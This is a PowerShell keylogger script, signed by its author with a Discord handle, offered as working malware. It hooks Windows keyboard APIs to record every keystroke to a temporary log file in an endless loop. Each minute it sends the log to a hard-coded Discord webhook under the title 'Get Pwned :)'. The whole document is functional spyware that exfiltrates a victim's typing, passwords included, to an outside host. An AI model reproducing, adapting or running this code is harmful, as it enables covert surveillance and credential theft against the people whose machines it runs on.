# MADE BY SYKE
# Discord: syke#1166 / Syke#1166

 
 $generateLog = New-Item -Path $env:temp/keylogger.log -ItemType File -Force

 function Webhook($webhook = 'https://discord.com/api/webhooks/942511068402581534/E6E8_u6Dzfoh6elANGpHrkpeCQxzDvmhdp8qWjVfM2aVqmKVUutk50sOxcENkPmSpTq7'){

#Create embed array
    [System.Collections.ArrayList]$embedArray = @()
    
    #Store embed values
    $title       = 'Get Pwned :)'
    $description = [IO.File]::ReadAllText("$env:tmp\keylogger.log")
     $color       = '1'
    
    #Create thumbnail object
    $thumbUrl = 'https://thumbs.gfycat.com/ApprehensiveOddballAgama-max-1mb.gif'
    $thumbnailObject = @{
    
        url = $thumbUrl
    
    }
    
    #Create embed object, also adding thumbnail
    $embedObject = [PSCustomObject]@{
    
        title    = $title
        description = $description
        color      = $color
        thumbnail   = $thumbnailObject
    
    }
    
    #Add embed object to array
    $embedArray.Add($embedObject)
    
    #Create the payload
    $payload = [PSCustomObject]@{
    
       embeds = $embedArray
    
    }
    
    #Send over payload, converting it to JSON
    Invoke-RestMethod -Uri $webhook -Body ($payload | ConvertTo-Json -Depth 4) -Method POST -ContentType 'application/json' -Verbose

      $generateLog = New-Item -Path $env:temp/keylogger.log -ItemType File -Force
     }


# keylogger
function Keylogger($logFile="$env:temp/keylogger.log") {


   # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
  


      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $generateLog = [console]::CapsLock
          
          

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
           

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($logFile, $mychar, [System.Text.Encoding]::Unicode) 
          }
          
        }
      }
      
    }
    
     $time = Get-Date -Format mm
     
     

      while($true)
     {
     Keylogger
     $time2 = Get-Date -Format mm
     if($time -ne $time2)
     {
         
         Webhook
         $time = $time2
      }

    }

